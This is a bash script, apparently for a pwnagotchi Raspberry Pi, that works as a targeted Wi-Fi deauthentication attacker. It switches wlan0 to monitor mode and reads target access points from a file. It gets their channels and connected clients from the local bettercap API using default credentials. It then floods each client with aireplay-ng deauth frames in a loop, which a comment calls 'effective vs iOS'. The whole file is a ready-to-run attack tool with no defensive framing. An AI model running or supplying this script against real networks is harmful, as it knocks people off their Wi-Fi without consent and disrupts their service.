#!/bin/bash
# ACID dedicated TARGETED deauther via built-in nexmon (wlan0). Independent of the ACM recon.
# /tmp/acid_deauth_targets = one AP BSSID per line. Stops when /tmp/acid_deauth_stop exists.
# Targets each client of the AP individually (effective vs iOS); SKIPS the Pi's own wlan1 (so SSH stays up).
DMON=dmon
SELF=$(cat /sys/class/net/wlan1/address 2>/dev/null | tr 'A-Z' 'a-z')
cleanup() { pkill -f "aireplay-ng --deauth" 2>/dev/null; iw dev $DMON del 2>/dev/null; ip link set wlan0 down 2>/dev/null; }
trap 'cleanup; exit 0' TERM INT EXIT
rm -f /tmp/acid_deauth_stop
pkill -f "aireplay-ng --deauth" 2>/dev/null
iw dev $DMON del 2>/dev/null
PHY=$(cat /sys/class/net/wlan0/phy80211/name 2>/dev/null)
if ! iw phy "$PHY" interface add $DMON type monitor 2>/dev/null; then
  modprobe -r brcmfmac 2>/dev/null; sleep 1; modprobe brcmfmac 2>/dev/null; sleep 3
  PHY=$(cat /sys/class/net/wlan0/phy80211/name 2>/dev/null)
  iw phy "$PHY" interface add $DMON type monitor 2>/dev/null
fi
ip link set wlan0 down 2>/dev/null
ip link set $DMON up 2>/dev/null
sleep 1
while [ ! -f /tmp/acid_deauth_stop ]; do
  while read -r BSSID; do
    [ -f /tmp/acid_deauth_stop ] && break 2
    [ -z "$BSSID" ] && continue
    INFO=$(curl -s -u pwnagotchi:pwnagotchi http://127.0.0.1:8081/api/session --max-time 4 2>/dev/null | python3 -c "
import sys,json
b='$BSSID'.lower()
try:
  d=json.load(sys.stdin)
  for a in d['wifi']['aps']:
    if str(a.get('mac','')).lower()==b:
      print(a.get('channel',0))
      for c in a.get('clients',[]): print(str(c.get('mac','')).lower())
      break
except Exception: pass
" 2>/dev/null)
    CH=$(echo "$INFO" | head -1)
    if [ -z "$CH" ] || [ "$CH" = "0" ]; then continue; fi
    iw dev $DMON set channel "$CH" 2>/dev/null
    echo "$INFO" | tail -n +2 | while read -r CL; do
      [ -z "$CL" ] && continue
      [ "$CL" = "$SELF" ] && continue
      timeout 2 aireplay-ng --deauth 10 -a "$BSSID" -c "$CL" -D $DMON >/dev/null 2>&1
    done
  done < /tmp/acid_deauth_targets
  sleep 0.2
done
cleanup
